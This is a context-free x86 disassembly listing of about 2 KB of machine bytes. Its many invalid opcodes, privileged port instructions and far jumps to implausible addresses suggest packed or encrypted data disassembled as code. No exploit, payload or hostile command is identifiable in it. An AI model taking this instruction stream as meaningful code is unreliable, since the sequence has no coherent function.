  426702:	and    BYTE PTR [edi],dh
  426704:	stos   BYTE PTR es:[edi],al
  426705:	cmp    BYTE PTR [esi-0x60],0x35
  426709:	jle    0x42676d
  42670b:	mov    al,ds:0x60d2217f
  426710:	std    
  426711:	dec    edx
  426712:	ins    DWORD PTR es:[edi],dx
  426713:	je     0x426746
  426715:	popa   
  426716:	cs push ecx
  426718:	data16 mov bl,0x66
  42671b:	mov    ds:0xe5e7e982,al
  426720:	push   esi
  426721:	mov    eax,0x723e9710
  426726:	push   esi
  426727:	leave  
  426728:	inc    ebp
  426729:	popa   
  42672a:	loopne 0x4266f9
  42672c:	mov    esp,0xaa1069fb
  426731:	int3   
  426732:	(bad)  
  426733:	mov    ebp,0x65aea7c4
  426738:	mov    ?,WORD PTR [ecx+edx*8-0x5]
  42673c:	xchg   DWORD PTR [eax+0x7],esp
  42673f:	cmp    BYTE PTR [edi-0x9],0x12
  426743:	or     bl,BYTE PTR [ebp+0x1f]
  426746:	out    dx,al
  426747:	outs   dx,DWORD PTR ds:[esi]
  426748:	std    
  426749:	es pop edx
  42674b:	mov    edx,0xa1676402
  426750:	xor    ebx,DWORD PTR [edi+0x143f10ad]
  426756:	stos   DWORD PTR es:[edi],eax
  426757:	sahf   
  426758:	ss repz jae 0x4266fd
  42675c:	or     BYTE PTR [ecx-0x560e00],bl
  426762:	lea    ecx,gs:[ecx-0x441e5e65]
  426769:	call   0x844c:0xae14a744
  426770:	pop    esi
  426771:	cmp    edx,edi
  426773:	ror    BYTE PTR [esi+0x8ba7bdc],0x61
  42677a:	jno    0x42672b
  42677c:	ja     0x426709
  42677e:	and    eax,0x52a300a3
  426783:	jge    0x4267e3
  426785:	data16 fadd DWORD PTR [esi+0x3]
  426789:	xlat   BYTE PTR ds:[ebx]
  42678a:	xor    BYTE PTR [ebp+0x79],ch
  42678d:	pusha  
  42678e:	call   0x624d:0xc5fcbd4a
  426795:	add    edx,DWORD PTR [edx]
  426797:	jae    0x42671e
  426799:	pop    ecx
  42679a:	sti    
  42679b:	iret   
  42679c:	(bad)  
  42679d:	imul   ebp,esi,0x13
  4267a0:	out    dx,eax
  4267a1:	xchg   edi,eax
  4267a2:	cs addr16 int3 
  4267a5:	fucomp st(6)
  4267a7:	mov    eax,ds:0xa30f388a
  4267ac:	push   esi
  4267ad:	clc    
  4267ae:	add    DWORD PTR [ecx-0x77fbe65f],esp
  4267b4:	dec    ebx
  4267b5:	cmp    cl,BYTE PTR [ecx]
  4267b7:	xor    eax,0xfa44215b
  4267bc:	ins    BYTE PTR es:[edi],dx
  4267bd:	sub    eax,0x59a704de
  4267c2:	add    ch,dl
  4267c4:	hlt    
  4267c5:	pusha  
  4267c6:	imul   eax,edi,0x67b8da7d
  4267cc:	push   0x67fbee87
  4267d1:	das    
  4267d2:	mov    dl,0x7d
  4267d4:	iret   
  4267d5:	mov    WORD PTR [ebp+0x84dbea1],ss
  4267db:	mov    ecx,0x12d425f3
  4267e0:	pop    edi
  4267e1:	xlat   BYTE PTR ds:[ebx]
  4267e2:	mov    dl,BYTE PTR [ebx+0x39]
  4267e5:	xor    eax,0xbc0c3185
  4267ea:	fwait
  4267eb:	mov    eax,ds:0x884fa9d2
  4267f0:	mov    ch,0xaf
  4267f2:	scas   eax,DWORD PTR es:[edi]
  4267f3:	and    eax,0x2e24575e
  4267f8:	inc    ebp
  4267f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267fa:	add    DWORD PTR [ebp+0x4bcd6112],0x2f
  426801:	call   0x44ed:0xe518d86e
  426808:	daa    
  426809:	push   edi
  42680a:	test   BYTE PTR [ecx],cl
  42680c:	add    bl,BYTE PTR [edx+0x1e]
  42680f:	push   ebp
  426810:	(bad)  
  426811:	pusha  
  426812:	push   esi
  426813:	xchg   BYTE PTR [ecx],ch
  426815:	pushf  
  426816:	cmp    eax,0xee4caca0
  42681b:	outs   dx,DWORD PTR ds:[esi]
  42681c:	fucomp st(6)
  42681e:	and    ah,dh
  426820:	mov    ch,0x3d
  426822:	cld    
  426823:	mov    al,ds:0xc6ed5ba6
  426828:	fmul   DWORD PTR [edx-0x18]
  42682b:	test   eax,0xa588f15d
  426830:	mov    eax,ds:0x82da6ead
  426835:	sbb    ch,BYTE PTR [ebp-0x5f]
  426838:	test   eax,0x41d6b60c
  42683d:	push   0x3f5ef2f8
  426842:	xor    DWORD PTR [ebp-0x612b667c],esp
  426848:	in     eax,dx
  426849:	sbb    BYTE PTR [eax+eiz*2+0x5d],al
  42684d:	jb     0x426859
  42684f:	mov    dl,0xae
  426851:	hlt    
  426852:	jno    0x426855
  426854:	mov    al,ds:0x3f621ec1
  426859:	leave  
  42685a:	push   ss
  42685b:	fldenv [ebx+0x53]
  42685e:	loope  0x426806
  426860:	addr16 dec edi
  426862:	dec    esi
  426863:	sti    
  426864:	loopne 0x4268d3
  426866:	(bad)  
  426867:	push   ecx
  426868:	pop    esi
  426869:	loop   0x426841
  42686b:	scas   al,BYTE PTR es:[edi]
  42686c:	leave  
  42686d:	shl    DWORD PTR [esi+0x5660dd84],cl
  426873:	out    0x36,al
  426875:	icebp  
  426876:	cmp    al,al
  426878:	sub    BYTE PTR [edx+0x22],bh
  42687b:	gs out 0xd9,eax
  42687e:	sub    edi,DWORD PTR ds:0x33e7e4d
  426884:	aad    0xd2
  426886:	xchg   esi,eax
  426887:	mov    eax,ds:0xf365a438
  42688c:	test   al,0x97
  42688e:	mov    fs,WORD PTR [eax]
  426890:	sub    BYTE PTR ds:0x225906e7,0x6
  426897:	jnp    0x426877
  426899:	adc    DWORD PTR [ebx+0x4f497cee],esi
  42689f:	imul   esp,DWORD PTR [edi-0x41acffa0],0x26
  4268a6:	add    edx,esi
  4268a8:	pop    edi
  4268a9:	push   edi
  4268aa:	ficom  DWORD PTR [ecx]
  4268ac:	jno    0x426834
  4268ae:	jo     0x42684d
  4268b0:	sbb    eax,DWORD PTR ss:[esi+0x3]
  4268b4:	jp     0x426872
  4268b6:	jmp    0x42690a
  4268b8:	jg     0x426881
  4268ba:	sahf   
  4268bb:	ins    WORD PTR es:[edi],dx
  4268bd:	test   al,0xa9
  4268bf:	dec    esp
  4268c0:	(bad)  
  4268c1:	mov    esi,0x653fa159
  4268c6:	push   ebx
  4268c7:	sbb    al,0x6b
  4268ca:	add    al,0xe7
  4268cc:	inc    esp
  4268cd:	jno    0x426883
  4268cf:	or     bl,BYTE PTR [esi-0x62]
  4268d2:	(bad)  
  4268d3:	icebp  
  4268d4:	xchg   BYTE PTR [edx],cl
  4268d6:	xchg   esp,eax
  4268d7:	mov    eax,ds:0xd21cf5f9
  4268dc:	shl    DWORD PTR [ebx],1
  4268de:	mov    al,0x10
  4268e0:	xor    eax,0xb6211a3f
  4268e5:	adc    ecx,DWORD PTR [ebp-0x663d5f40]
  4268eb:	mov    eax,ds:0x59735dc6
  4268f0:	inc    edx
  4268f1:	cmp    al,0x35
  4268f3:	mov    edi,0x2d7f0164
  4268f8:	cs popa 
  4268fa:	dec    edi
  4268fb:	mov    es,edx
  4268fd:	test   BYTE PTR [esi],ah
  4268ff:	jmp    0x7064ca5f
  426904:	sti    
  426905:	jle    0x426974
  426907:	xchg   DWORD PTR [ecx+0x592f265a],edx
  42690d:	dec    ebx
  42690e:	ss push edi
  426910:	pop    esi
  426911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426912:	jns    0x4268ea
  426914:	pop    eax
  426915:	imul   eax,eax,0xb1cd6ba0
  42691b:	dec    esp
  42691c:	repz jmp 0xe917:0xf25d08cc
  426924:	fwait
  426925:	call   0x9330:0x4382d30b
  42692c:	daa    
  42692d:	dec    esp
  42692e:	std    
  42692f:	mov    ds:0xb196743e,eax
  426934:	sahf   
  426935:	jp     0x42697c
  426937:	jp     0x426997
  426939:	fcomp  DWORD PTR [eax-0x57]
  42693c:	sub    edx,DWORD PTR [ebx]
  42693e:	add    edx,DWORD PTR [ecx+0x75]
  426941:	pusha  
  426942:	mov    esp,0x1620bcbb
  426947:	adc    esi,eax
  426949:	or     esi,ebp
  42694b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42694c:	cmc    
  42694d:	es dec ebp
  42694f:	mov    esi,0xa14557d9
  426954:	mov    ah,0xda
  426956:	ss ins DWORD PTR es:[edi],dx
  426958:	out    0x6f,eax
  42695a:	xchg   BYTE PTR [ebp+0x347a8b5e],bh
  426960:	fdivrp st(3),st
  426962:	add    al,0xab
  426964:	fs icebp 
  426966:	cmp    ah,BYTE PTR [ecx+0x35e1e4a7]
  42696c:	and    BYTE PTR [edx+0xd],dl
  42696f:	mov    al,0x42
  426971:	mov    ebp,0x2f5ef1d8
  426976:	cs gs xchg esp,eax
  426979:	fnsave [ebx]
  42697b:	mov    eax,ds:0xf43a509d
  426980:	mov    DWORD PTR ds:0xfe6aea50,eax
  426986:	xlat   BYTE PTR ds:[ebx]
  426987:	std    
  426988:	pop    esi
  426989:	mov    esp,0x4a1c1399
  42698e:	es push ds
  426990:	and    BYTE PTR [ecx-0x2b],ah
  426993:	cmp    al,0x3
  426995:	call   0xe57e8e3d
  42699a:	pop    ds
  42699b:	daa    
  42699c:	gs loope 0x4269b9
  42699f:	aad    0x90
  4269a1:	adc    ebx,DWORD PTR [eax]
  4269a3:	adc    ebx,DWORD PTR [edi-0x10122a1]
  4269a9:	pop    ebp
  4269aa:	std    
  4269ab:	push   ebp
  4269ac:	jle    0x426966
  4269ae:	pop    ecx
  4269af:	imul   ebx,DWORD PTR [esi+0x52],0x3b
  4269b3:	xchg   DWORD PTR [esi],esi
  4269b5:	in     al,0xbb
  4269b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269b8:	and    DWORD PTR [ecx-0x65caea38],esp
  4269be:	add    DWORD PTR [ebp-0x7a0a36a2],0x35cecffb
  4269c8:	test   al,0x60
  4269ca:	bound  eax,QWORD PTR [eax-0x41]
  4269cd:	loopne 0x426a0b
  4269cf:	dec    esp
  4269d0:	inc    ebx
  4269d1:	pushf  
  4269d2:	out    dx,al
  4269d3:	mov    cs,WORD PTR [edi+ecx*1-0x3819c0fd]
  4269da:	cwde   
  4269db:	add    DWORD PTR [ebp+0x61],0x7dd4cbf0
  4269e2:	loopne 0x426a35
  4269e4:	xor    dl,BYTE PTR gs:[edx]
  4269e7:	jnp    0x4269b1
  4269e9:	cs out dx,al
  4269eb:	or     DWORD PTR [edx],esi
  4269ed:	and    bh,bh
  4269ef:	jnp    0x426a33
  4269f1:	popa   
  4269f2:	mov    dh,0x78
  4269f4:	fcmove st,st(0)
  4269f6:	jl     0x4269ce
  4269f8:	add    al,0x8c
  4269fa:	fcom   QWORD PTR [ecx]
  4269fc:	pop    esi
  4269fd:	mov    ds:0x22b452ef,eax
  426a02:	mov    ebp,0x31ad2445
  426a07:	xor    DWORD PTR [eax+0x5d],ecx
  426a0a:	sbb    BYTE PTR [esi+esi*1-0x7a],ch
  426a0e:	and    ah,BYTE PTR [ebp+eax*8+0x69]
  426a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a13:	in     eax,0xb5
  426a15:	mov    ebx,0x585e08dc
  426a1a:	adc    BYTE PTR [edx],cl
  426a1c:	ds rcl ah,0xc6
  426a20:	jb     0x426a82
  426a22:	fidivr DWORD PTR [ecx]
  426a24:	in     al,0x4c
  426a26:	js     0x426a96
  426a28:	popa   
  426a29:	pushf  
  426a2a:	out    dx,al
  426a2b:	xchg   ebp,eax
  426a2c:	push   edx
  426a2d:	jge    0x4269e2
  426a2f:	add    BYTE PTR [ebx+0x78],al
  426a32:	aaa    
  426a33:	imul   esi,ebp,0x60
  426a36:	out    dx,eax
  426a37:	push   esp
  426a38:	dec    esi
  426a39:	jmp    0x997fc81a
  426a3e:	out    dx,al
  426a3f:	fs and eax,0xb94fb94b
  426a45:	das    
  426a46:	add    al,0xa1
  426a48:	aam    0x28
  426a4a:	xchg   ebx,eax
  426a4b:	sub    eax,ebp
  426a4d:	mov    ds:0x1f38dbae,al
  426a52:	sbb    DWORD PTR [esi],ecx
  426a54:	push   esp
  426a55:	data16 scas al,BYTE PTR es:[edi]
  426a57:	sub    al,0xbf
  426a59:	fwait
  426a5a:	and    al,BYTE PTR [edi+ebp*4-0x9fd6fa0]
  426a61:	add    ecx,ebx
  426a63:	inc    esi
  426a64:	sub    eax,DWORD PTR [ebx-0x44e37412]
  426a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a6b:	clc    
  426a6c:	stos   DWORD PTR es:[edi],eax
  426a6d:	and    esp,DWORD PTR [ebp+0x73]
  426a70:	cwde   
  426a71:	pusha  
  426a72:	add    bl,cl
  426a74:	stc    
  426a75:	and    BYTE PTR [ecx],al
  426a77:	hlt    
  426a78:	mov    ah,0x8b
  426a7a:	out    dx,al
  426a7b:	fild   QWORD PTR [esi-0x1f36d0c6]
  426a81:	pop    ebx
  426a82:	or     eax,0xf5e7d1a1
  426a87:	pop    es
  426a88:	mov    edx,0x5f4c9f2b
  426a8d:	or     al,BYTE PTR [ecx]
  426a8f:	aam    0xcc
  426a91:	int3   
  426a92:	push   ss
  426a93:	dec    ecx
  426a94:	add    eax,0xd9a15fe0
  426a99:	bound  ebx,QWORD PTR [esi+0x2d]
  426a9c:	daa    
  426a9d:	(bad)  
  426a9f:	inc    eax
  426aa0:	pop    esi
  426aa1:	mov    dl,0xcb
  426aa3:	mov    al,0xcd
  426aa5:	in     al,dx
  426aa6:	lds    esi,FWORD PTR [edi-0x67]
  426aa9:	bound  ebp,QWORD PTR [edi-0xd]
  426aac:	fiadd  WORD PTR [ebx+ebx*2+0x6e]
  426ab0:	xchg   BYTE PTR [eax+0x16],cl
  426ab3:	es pop edx
  426ab5:	mov    ebx,ds
  426ab7:	sbb    al,0xb1
  426ab9:	mov    bl,0x2e
  426abb:	push   eax
  426abc:	cmp    al,0x78
  426abe:	pop    esi
  426abf:	scas   eax,DWORD PTR es:[edi]
  426ac0:	dec    edx
  426ac1:	bound  eax,QWORD PTR [esi-0x59]
  426ac4:	pop    esi
  426ac5:	cmp    al,0x9f
  426ac7:	lods   eax,DWORD PTR ds:[esi]
  426ac8:	push   edx
  426ac9:	and    al,0x5d
  426acb:	cmp    ebx,DWORD PTR [esi-0x4d]
  426ace:	push   ebx
  426acf:	jmp    FWORD PTR [edx+edx*8+0x60828830]
  426ad6:	xlat   BYTE PTR ds:[ebx]
  426ad7:	mov    cl,0x3e
  426ad9:	xor    ch,BYTE PTR [eax+0x1d]
  426adc:	inc    edi
  426add:	es out dx,al
  426adf:	mov    WORD PTR [edi],?
  426ae1:	in     eax,dx
  426ae2:	or     DWORD PTR [esp+esi*8],edi
  426ae5:	mov    DWORD PTR [ebx-0x5f],esi
  426ae8:	xchg   esi,eax
  426ae9:	adc    DWORD PTR [edi+ebp*4-0x24b7aba8],edx
  426af0:	pop    esi
  426af1:	and    DWORD PTR [edi+eax*2-0x22],ebp
  426af5:	pop    edi
  426af6:	call   0xa33e36
  426afb:	leave  
  426afc:	sbb    BYTE PTR [eax-0x44],dh
  426aff:	xor    BYTE PTR [ecx+0x1367ee71],bh
  426b05:	retf   0x6780
  426b08:	gs hlt 
  426b0a:	out    0xa0,al
  426b0c:	jge    0x426ae3
  426b0e:	outs   dx,DWORD PTR ds:[esi]
  426b0f:	jle    0x426b90
  426b11:	arpl   WORD PTR [esi-0x1],bp
  426b14:	pop    esi
  426b15:	sub    al,0xce
  426b17:	shr    DWORD PTR [eax],1
  426b19:	into   
  426b1a:	push   ss
  426b1b:	pop    ebx
  426b1c:	add    ah,BYTE PTR [ecx+0x2e]
  426b1f:	aas    
  426b20:	xor    bl,cl
  426b22:	sbb    eax,0x5061910e
  426b27:	and    dh,ah
  426b29:	gs out dx,al
  426b2b:	test   DWORD PTR ds:0x90550c46,edx
  426b31:	xlat   BYTE PTR ds:[ebx]
  426b32:	leave  
  426b33:	mov    al,ds:0xdad27081
  426b38:	dec    ebp
  426b39:	sbb    ebp,esi
  426b3b:	hlt    
  426b3c:	pop    esi
  426b3d:	adc    al,0x5b
  426b3f:	js     0x426ae7
  426b41:	sub    ch,BYTE PTR [ebp-0x7b]
  426b44:	or     eax,0x33ba4761
  426b49:	mov    edi,0x1fd21014
  426b4e:	adc    al,dh
  426b50:	jne    0x426b21
  426b52:	out    dx,al
  426b53:	aad    0xf9
  426b55:	add    eax,0x566e1bae
  426b5a:	push   ebp
  426b5b:	add    BYTE PTR [ecx-0x60],ch
  426b5e:	jno    0x426b01
  426b60:	(bad)  
  426b61:	mov    ebp,0xfb7e1a76
  426b66:	out    dx,al
  426b67:	mov    ah,cl
  426b69:	ret    
  426b6a:	cli    
  426b6b:	mov    edx,0x908ef401
  426b70:	ror    ch,cl
  426b72:	pop    edx
  426b73:	mov    eax,ds:0x7acb957b
  426b78:	lock and DWORD PTR [esi],0x71e0b0b8
  426b7f:	test   eax,0x4d7bb331
  426b84:	mov    ebp,0x15378959
  426b89:	retf   0x1429
  426b8c:	jae    0x426b35
  426b8e:	push   esi
  426b8f:	mov    dh,0xdb
  426b91:	repz in eax,dx
  426b93:	xor    BYTE PTR [edi],0x15
  426b96:	cs jmp 0x426b5b
  426b99:	jno    0x426be1
  426b9b:	aaa    
  426b9c:	xchg   BYTE PTR [ecx-0x3e],bl
  426b9f:	mov    edi,ds
  426ba1:	sbb    BYTE PTR [esi],bh
  426ba3:	icebp  
  426ba4:	ds add al,0xa9
  426ba7:	mov    esp,0xfcb8c959
  426bac:	or     BYTE PTR [edi-0x10],ch
  426baf:	jnp    0x426c2f
  426bb1:	pusha  
  426bb2:	lds    esi,FWORD PTR [edx+edi*2]
  426bb5:	loopne 0x426bbb
  426bb7:	mov    eax,ds:0xa6cc9c65
  426bbc:	out    dx,eax
  426bbd:	adc    BYTE PTR [edx+eax*4-0x62d583a2],cl
  426bc4:	pop    ecx
  426bc5:	dec    edx
  426bc6:	std    
  426bc7:	bound  eax,QWORD PTR [edi-0x2809c2a0]
  426bcd:	mov    dl,0x91
  426bcf:	sbb    DWORD PTR [ebx],edi
  426bd1:	adc    al,0xee
  426bd3:	loope  0x426bfc
  426bd5:	adc    DWORD PTR [eax],0xcd69da6c
  426bdb:	mov    al,ds:0x8db21868
  426be0:	pop    es
  426be1:	mov    eax,0x465ec65d
  426be6:	popf   
  426be7:	hlt    
  426be8:	jo     0x426bd4
  426bea:	(bad)  
  426beb:	scas   eax,DWORD PTR es:[edi]
  426bec:	in     eax,0x60
  426bee:	imul   ecx,DWORD PTR [eax+0x14a16e6c],0x1b
  426bf5:	daa    
  426bf6:	cmc    
  426bf7:	jne    0x426c25
  426bf9:	mov    bl,0x77
  426bfb:	outs   dx,BYTE PTR ds:[esi]
  426bfc:	ficomp WORD PTR [eax+ecx*1-0x7c]
  426c00:	sub    dh,bl
  426c02:	fst    st(4)
  426c04:	pop    ebx
  426c05:	add    DWORD PTR [esi+0x5c],eax
  426c08:	in     al,0xaf
  426c0a:	fmulp  st(0),st
  426c0c:	out    dx,eax
  426c0d:	mov    ds:0x7cc0bef7,eax
  426c12:	leave  
  426c13:	test   al,0x5e
  426c15:	sub    al,0x81
  426c17:	test   cl,dh
  426c19:	sbb    BYTE PTR [esi+edi*8-0x11],ch
  426c1d:	out    0x8,al
  426c1f:	stos   BYTE PTR es:[edi],al
  426c20:	int3   
  426c21:	xor    al,0xee
  426c23:	xor    bh,BYTE PTR [ecx+0x6fd3c501]
  426c29:	bound  esi,QWORD PTR [ebp-0x2da6157d]
  426c2f:	add    edi,eax
  426c31:	mov    esi,0xeb4e122
  426c36:	fs adc eax,0x718a2e5e
  426c3c:	or     BYTE PTR [esi+0x73],ah
  426c3f:	sahf   
  426c40:	mov    cl,0xa6
  426c42:	and    eax,0x881375a1
  426c47:	sbb    BYTE PTR [edx+0x51987e6e],dh
  426c4d:	dec    ebp
  426c4e:	mov    bh,0xc0
  426c50:	ja     0x426cb2
  426c52:	(bad)  
  426c53:	aad    0xa0
  426c55:	sbb    ah,al
  426c57:	sub    BYTE PTR [eax+0x60],bh
  426c5a:	scas   al,BYTE PTR es:[edi]
  426c5b:	fxch   st(5)
  426c5d:	dec    esi
  426c5e:	adc    esi,ebx
  426c60:	xchg   esp,eax
  426c61:	sar    bl,cl
  426c63:	aad    0x60
  426c65:	retf   
  426c66:	out    0xa3,eax
  426c68:	idiv   ecx
  426c6a:	mov    esi,0x2d1e15c8
  426c6f:	stos   DWORD PTR es:[edi],eax
  426c70:	clc    
  426c71:	adc    DWORD PTR [esi+0x3c],ebp
  426c74:	xchg   ebx,eax
  426c75:	push   edi
  426c76:	bound  ebx,QWORD PTR [ecx+0x64]
  426c79:	push   esp
  426c7a:	jmp    0x426cb0
  426c7c:	mov    bl,0xa6
  426c7e:	inc    esi
  426c7f:	outs   dx,BYTE PTR ds:[esi]
  426c80:	lahf   
  426c81:	mov    al,0xdf
  426c83:	adc    DWORD PTR [ebx],esi
  426c85:	popa   
  426c86:	jae    0x426ce2
  426c88:	adc    DWORD PTR [esi-0x77],eax
  426c8b:	retf   
  426c8c:	(bad)  
  426c8d:	jecxz  0x426c8e
  426c8f:	inc    eax
  426c90:	loopne 0x426ca9
  426c92:	cmp    DWORD PTR [edx+0x1e],0x22373aea
  426c99:	adc    cl,BYTE PTR [eax+0x200a7ba1]
  426c9f:	(bad)  
  426ca0:	(bad)
  426ca3:	xor    al,0x4c
  426ca5:	dec    esi
  426ca6:	pop    esi
  426ca7:	mov    ds:0xeab885b,eax
  426cac:	ds mov bh,0x10
  426caf:	ja     0x426d12
  426cb1:	popa   
  426cb2:	iret   
  426cb3:	lods   eax,DWORD PTR ds:[esi]
  426cb4:	sbb    dl,BYTE PTR [edx+ebp*2+0x2db70bb]
  426cbb:	test   DWORD PTR [ebx],esi
  426cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cbe:	outs   dx,BYTE PTR ds:[esi]
  426cbf:	pop    edi
  426cc0:	xchg   BYTE PTR [esi+0x5da6c2ae],dl
  426cc6:	aad    0xe1
  426cc8:	xor    bl,al
  426cca:	(bad)  
  426ccb:	and    BYTE PTR [ebx-0x20],bh
  426cce:	push   edi
  426ccf:	add    ch,ah
  426cd1:	sti    
  426cd2:	out    dx,al
  426cd3:	sub    cl,BYTE PTR [ebp+0x279f06a1]
  426cd9:	cmp    BYTE PTR [eax+0x3e47eba1],0xf9
  426ce0:	aas    
  426ce1:	push   edx
  426ce2:	jae    0x426d3d
  426ce4:	sbb    BYTE PTR [ebp-0x19],bh
  426ce7:	out    0x26,eax
  426ce9:	sub    BYTE PTR [esi],al
  426ceb:	mov    eax,0x418b814e
  426cf0:	add    al,0x7d
  426cf2:	aas    
  426cf3:	addr16 inc esi
  426cf5:	popa   
  426cf6:	dec    edi
  426cf7:	es mov bh,al
  426cfa:	mov    ah,0xc4
  426cfc:	pop    esi
  426cfd:	jb     0x426d1e
  426cff:	xor    DWORD PTR [esi-0x5e61ba02],ebx
  426d05:	pop    ecx
  426d06:	mov    ds:0xbbc71ff6,eax
  426d0b:	push   eax
  426d0c:	shl    DWORD PTR [ebx*2+0x7e0a59c2],0xa
  426d14:	mov    dl,0x1a
  426d16:	out    dx,al
  426d17:	xor    eax,ebp
  426d19:	mov    eax,0x60f60fe8
  426d1e:	scas   eax,DWORD PTR es:[edi]
  426d1f:	and    DWORD PTR [edi-0x2a9ec945],0x76
  426d26:	out    dx,al
  426d27:	mov    ch,0x8c
  426d29:	mov    edx,0xf696ca87
  426d2e:	clc    
  426d2f:	mov    al,ds:0x957777b0
  426d34:	mov    bl,0x73
  426d36:	cmc    
  426d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d38:	xor    edx,ebx
  426d3a:	out    dx,eax
  426d3b:	stos   DWORD PTR es:[edi],eax
  426d3c:	data16 loope 0x426d28
  426d3f:	mov    ecx,DWORD PTR [edx+0xf20bcb0]
  426d45:	popa   
  426d46:	sub    BYTE PTR [esi-0x5d],bh
  426d49:	jno    0x426d03
  426d4b:	mov    ch,0x94
  426d4d:	inc    ecx
  426d4e:	out    dx,al
  426d4f:	push   0x9a92240
  426d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d55:	mov    esi,0x6210a14a
  426d5a:	in     al,0x9c
  426d5c:	pop    edi
  426d5d:	push   0x31
  426d5f:	sti    
  426d60:	cmp    ah,ch
  426d62:	arpl   WORD PTR [eax],sp
  426d64:	push   ebp
  426d65:	rol    ch,1
  426d67:	mov    eax,ds:0x7cdb71ce
  426d6c:	jbe    0x426dc9
  426d6e:	pop    edx
  426d6f:	lahf   
  426d70:	cdq    
  426d71:	ins    BYTE PTR es:[edi],dx
  426d72:	or     BYTE PTR [edi+0x7e],dl
  426d75:	add    DWORD PTR ds:0xf0619548,0x99b6723
  426d7f:	cmp    al,0x36
  426d81:	loope  0x426d05
  426d83:	adc    ebx,ecx
  426d85:	sub    ebx,ecx
  426d87:	mov    al,ds:0x492e5138
  426d8c:	test   eax,0x648e3000
  426d91:	repz pop ds
  426d93:	ror    DWORD PTR [ebx+0x11a3e180],1
  426d99:	jbe    0x426dfc
  426d9b:	mov    eax,ds:0xdb965795
  426da0:	add    dh,BYTE PTR [edx+0x7]
  426da3:	dec    ecx
  426da4:	pop    esi
  426da5:	mov    eax,ds:0x4ff503a9
  426daa:	mov    ebp,0x9a609913
  426daf:	shr    DWORD PTR [ebx-0x7b],0x80
  426db3:	add    DWORD PTR [edx-0x6b],ecx
  426db6:	jmp    0x8c45cd7d
  426dbb:	sbb    al,0xde
  426dbd:	not    ah
  426dbf:	lock mov BYTE PTR [eax-0x7c],ah
  426dc3:	fwait
  426dc4:	cmp    eax,0x61805372
  426dc9:	call   0xe3a87ccf
  426dce:	scas   al,BYTE PTR es:[edi]
  426dcf:	xlat   BYTE PTR ds:[ebx]
  426dd0:	in     al,0x26
  426dd2:	arpl   di,dx
  426dd4:	into   
  426dd5:	pusha  
  426dd6:	sbb    eax,ecx
  426dd8:	jo     0x426d9f
  426dda:	jge    0x426d78
  426ddc:	scas   eax,DWORD PTR es:[edi]
  426ddd:	mov    ecx,0xe48154f7
  426de2:	out    dx,al
  426de3:	pop    ecx
  426de4:	cmc    
  426de5:	int    0x73
  426de7:	les    edi,FWORD PTR [eax+0x59b4fa60]
  426ded:	rcr    BYTE PTR [edx-0xad33495],cl
  426df3:	sbb    BYTE PTR [edx+0x72],0x32
  426df7:	and    DWORD PTR [ebx-0x3ef272c2],ecx
  426dfd:	and    eax,0x89ea19e
  426e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e03:	or     BYTE PTR [ebx+0x1d],0xc4
  426e07:	push   esi
  426e08:	pop    esi
  426e09:	out    0xff,eax
  426e0b:	mov    cl,0xd3
  426e0d:	shl    eax,1
  426e0f:	popf   
  426e10:	je     0x426e55
  426e12:	ret    0x875d
  426e15:	pop    esi
  426e16:	sahf   
  426e17:	(bad)  
  426e19:	test   BYTE PTR [ebx+0x3a],0xc6
  426e1d:	pop    edi
  426e1e:	lods   al,BYTE PTR ds:[esi]
  426e1f:	and    bl,BYTE PTR [esi-0x24]
  426e22:	loopne 0x426e16
  426e24:	mov    ds:0x624d2a35,eax
  426e29:	pop    eax
  426e2a:	jg     0x426e64
  426e2c:	stc    
  426e2d:	loopne 0x426e1e
  426e2f:	pop    eax
  426e30:	sahf   
  426e31:	aaa    
  426e32:	idiv   DWORD PTR [esi]
  426e34:	enter  0xee1d,0x30
  426e38:	pop    edi
  426e39:	adc    eax,0x9eabf924
  426e3e:	pop    eax
  426e3f:	mov    eax,ds:0x3fb09720
  426e44:	clc    
  426e45:	push   edi
  426e46:	adc    ebp,DWORD PTR [ebp+0x195888f3]
  426e4c:	pop    esi
  426e4d:	pop    ebp
  426e4e:	add    bl,dh
  426e50:	test   eax,0x3b1fdaf9
  426e55:	popa   
  426e56:	retf   
  426e57:	iret   
  426e58:	leave  
  426e59:	jle    0x426e8f
  426e5b:	cli    
  426e5c:	or     dh,al
  426e5e:	out    dx,al
  426e5f:	mov    dh,0x2d
  426e61:	repz pop esi
  426e63:	add    eax,0xa36d5c93
  426e68:	sar    BYTE PTR [eax-0x3bbc6969],cl
  426e6e:	into   
  426e6f:	(bad)  [ebx+0x7a]
  426e72:	out    dx,al
  426e73:	jecxz  0x426e00
  426e75:	mov    ?,WORD PTR [ebp-0xd]
  426e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e79:	fsubr  QWORD PTR ds:0xc0d2e5a1
  426e7f:	dec    ecx
  426e80:	imul   ecx,DWORD PTR [ebx+0x25594041],0x66
  426e87:	imul   ecx,DWORD PTR [ecx],0x3a
  426e8a:	outs   dx,BYTE PTR ds:[esi]
  426e8b:	pop    es
  426e8c:	cdq    
  426e8d:	push   esi
  426e8e:	ja     0x426e34
  426e90:	mov    esp,0xcd6dea70
  426e95:	imul   BYTE PTR [esi]
  426e97:	xor    DWORD PTR [edi],eax
  426e99:	and    bl,BYTE PTR [esi-0x46]
  426e9c:	xchg   BYTE PTR [esi+ebp*8+0x28],dh
  426ea0:	cmp    al,0xff
  426ea2:	call   FWORD PTR [edi-0x5cf6fa97]
  426ea8:	adc    BYTE PTR [esi-0x74b54780],dh
  426eae:	fild   WORD PTR [ebx]
  426eb0:	sub    ch,BYTE PTR [edx-0x4c24f2a2]
  426eb6:	mov    fs,WORD PTR [ecx+0x2498ec54]
  426ebc:	fwait
  426ebd:	test   eax,0xfc5edde7
  426ec2:	sbb    al,0xd3
  426ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ec5:	mov    edi,0x57fcfc9f
  426eca:	clc    
  426ecb:	les    esp,FWORD PTR ds:0x4e506ee4
